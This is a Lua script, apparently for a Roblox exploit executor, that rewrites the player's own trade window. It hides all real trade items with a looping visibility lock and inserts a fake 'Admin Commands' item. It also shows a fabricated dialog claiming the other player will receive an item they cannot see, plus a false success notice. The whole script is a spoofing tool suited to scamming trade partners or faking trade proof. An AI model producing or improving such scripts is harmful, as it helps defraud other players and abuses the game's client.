--// Services
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Trade UI
local tradeUI = playerGui:WaitForChild("TradeLiveTrade"):WaitForChild("TradeLiveTrade")
local yourFrame = tradeUI:WaitForChild("Your")
local scrollingFrame = yourFrame:WaitForChild("ScrollingFrame")

local template = scrollingFrame:WaitForChild("Template")
local spacer = template:WaitForChild("Spacer")

local cash = spacer:WaitForChild("Cash")
local title = spacer:WaitForChild("Title")
local stroke = spacer:FindFirstChildOfClass("UIStroke")

--// Confirmation UI
local confirmationUI = playerGui:WaitForChild("Confirmation")
local warningTemplate = confirmationUI:WaitForChild("WarningTemplate")
local description = warningTemplate:WaitForChild("Content"):WaitForChild("Description")

local yesButton = warningTemplate:WaitForChild("Yes")
local noButton = warningTemplate:WaitForChild("No")

--// Notifications UI
local notificationUI = playerGui:WaitForChild("Notification"):WaitForChild("Notification")
local notifTemplate = notificationUI:WaitForChild("Template")

--// Colors
local defaultColor = Color3.fromRGB(35, 45, 50)
local clickedColor = Color3.fromRGB(15, 50, 60)
local strokeClickedColor = Color3.fromRGB(0, 0, 70)

--// Init UI text
cash.Text = "0/s"
title.Text = "Test"

description.Text =
"The other player will not see this item in the trade but will still receive the item. Do you still want to add this item to the trade?"

--// Add image once
if not spacer:FindFirstChild("CustomImage") then
	local image = Instance.new("ImageLabel")
	image.Name = "CustomImage"
	image.Parent = spacer
	image.BackgroundTransparency = 1
	image.Image = "rbxassetid://139291316302932"
	image.Size = UDim2.new(0.5, 0, 0.5, 0)
	image.Position = UDim2.new(0.25, 0, 0.25, 0)
end

--// Visibility lock system
local function enforceVisibility()
	for _, v in ipairs(scrollingFrame:GetChildren()) do
		if v ~= template and v:IsA("GuiObject") then
			v.Visible = false

			v:GetPropertyChangedSignal("Visible"):Connect(function()
				if v.Visible == true then
					v.Visible = false
				end
			end)
		end
	end
end

enforceVisibility()

scrollingFrame.ChildAdded:Connect(function()
	task.wait()
	enforceVisibility()
end)

task.spawn(function()
	while true do
		enforceVisibility()
		task.wait(0.05)
	end
end)

--// Default state
spacer.BackgroundColor3 = defaultColor
if stroke then
	stroke.Color = Color3.fromRGB(0, 0, 0)
end

local clicked = false

--// Safe clipboard function (Delta / executors)
local function copyToClipboard(text)
	pcall(function()
		if setclipboard then
			setclipboard(text)
		end
	end)
end

--// Notification helper
local function showNotification(text, color)
	local clone = notifTemplate:Clone()
	clone.Parent = notificationUI
	clone.Visible = true

	local txt = clone:FindFirstChildWhichIsA("TextLabel", true)
	if txt then
		txt.Text = text
		txt.TextColor3 = color
	end

	task.delay(3, function()
		if clone then
			clone:Destroy()
		end
	end)
end

--// OPEN CONFIRMATION
spacer.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		confirmationUI.Enabled = true
		warningTemplate.Visible = true
	end
end)

--// YES BUTTON
yesButton.MouseButton1Click:Connect(function()
	warningTemplate.Visible = false
	confirmationUI.Enabled = false

	clicked = true
	spacer.BackgroundColor3 = clickedColor

	if stroke then
		stroke.Color = strokeClickedColor
	end

	showNotification("Sucessfully added 'Admin Commands' to trade!", Color3.fromRGB(0, 255, 0))
end)

--// NO BUTTON
noButton.MouseButton1Click:Connect(function()
	warningTemplate.Visible = false
	confirmationUI.Enabled = false

	local failClone = notifTemplate:Clone()
	failClone.Name = "Fail"
	failClone.Parent = notificationUI
	failClone.Visible = true

	local txt = failClone:FindFirstChildWhichIsA("TextLabel", true)
	if txt then
		txt.Text = "Failed to add Gamepass"
		txt.TextColor3 = Color3.fromRGB(255, 0, 0)
	end

	-- copy error to clipboard (Delta feature)
	copyToClipboard("Failed to add Gamepass")

	task.delay(3, function()
		if failClone then
			failClone:Destroy()
		end
	end)
end)

--// Reset when UI hides
tradeUI:GetPropertyChangedSignal("Visible"):Connect(function()
	if not tradeUI.Visible then
		clicked = false
		spacer.BackgroundColor3 = defaultColor

		if stroke then
			stroke.Color = Color3.fromRGB(0, 0, 0)
		end
	end
end)
